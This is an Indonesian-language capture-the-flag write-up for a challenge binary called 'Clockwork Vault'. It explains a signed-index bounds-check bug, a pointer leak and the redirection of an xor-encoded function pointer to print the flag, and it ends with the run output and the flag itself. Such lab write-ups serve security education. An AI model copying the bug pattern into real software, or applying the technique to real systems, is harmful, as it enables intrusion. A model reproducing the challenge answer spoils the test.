# Clockwork Vault

Binary ini punya bug bounds check di index mekanisme. `inspect_slot()` dan `retune_slot()` cuma nolak index `> 7`, jadi nilai negatif tetap lolos. Karena aksesnya pakai `slots[idx + 2]`, index `-2` dan `-1` ngebuka dua slot tersembunyi:

- `-2` -> `service-key`
- `-1` -> `maint-core`

`service-key` nyimpen `service_cookie`. `maint-core` nyimpen `encoded_action`, yaitu pointer fungsi yang di-xor dengan cookie itu. `cycle()` bakal jalan kalau setting `maint-core` diubah ke konstanta `0x43414c4942524154`, lalu ia decode pointer itu dan `call rax`.

Alurnya:

1. Leak `service_cookie` dari slot `-2`.
2. Leak `encoded_action` dari slot `-1`.
3. Hitung alamat runtime `idle_cycle` dengan `service_cookie ^ encoded_action`.
4. Overwrite `maint-core` supaya `encoded_action` mengarah ke `open_vault`.
5. Jalankan `cycle()` buat manggil `open_vault()` dan cetak flag.

Build remote ternyata beda sedikit dari binary lokal. Delta `idle_cycle -> open_vault` di remote adalah `0x2b`, bukan delta lokal. Itu ketahuan dari brute kecil di sekitar alamat `idle_cycle` sampai ketemu output `The final lock disengages.`.

## Recon

```bash
rtk file clockwork_vault
rtk checksec --file=clockwork_vault
```

Hasil penting:

- amd64 ELF
- NX enabled
- Full RELRO
- PIE enabled
- No canary
- Not stripped

Proteksi ini nggak terlalu relevan karena primitive utamanya bukan stack smash, tapi indirect function call dari data segment.

## Detail bug

Disassembly penting:

```c
if (idx > 7) {
    puts("No such mechanism.");
    return;
}

slot = &slots[idx + 2];
```

Di `cycle()`:

```c
if (slots[1].setting != 0x43414c4942524154)
    reject;

fn = service_cookie ^ slots[1].encoded_action;
fn();
```

Itu cukup buat dapet arbitrary indirect call ke alamat yang kita kontrol.

## Leak yang dipakai

```text
index -2 -> service-key  -> Setting = service_cookie
index -1 -> maint-core   -> Encoded routine = service_cookie ^ idle_cycle
```

Jadi:

```text
idle_cycle = leak_cookie ^ leak_encoded
open_vault = idle_cycle + 0x2b   # remote build
```

## Exploit

```bash
source /home/nata/ctf_env/bin/activate
python solve.py REMOTE
```

Output:

```text
[+] Opening connection to 10.112.0.12 on port 42363: Done
[*] service_cookie = 0x3141592653589397
[*] core_setting   = 0x1111111111111111
[*] idle_addr      = 0x4013ba
[*] pie_base       = 0x40005e
[*] open_delta     = 0x2b
[*] open_vault     = 0x4013e5
Cycling the maintenance core...
The final lock disengages.
Flag: grodno{a7659078-8af9-4cc7-94fe-fe7f5514dee3}
```

## Flag

```text
grodno{a7659078-8af9-4cc7-94fe-fe7f5514dee3}
```
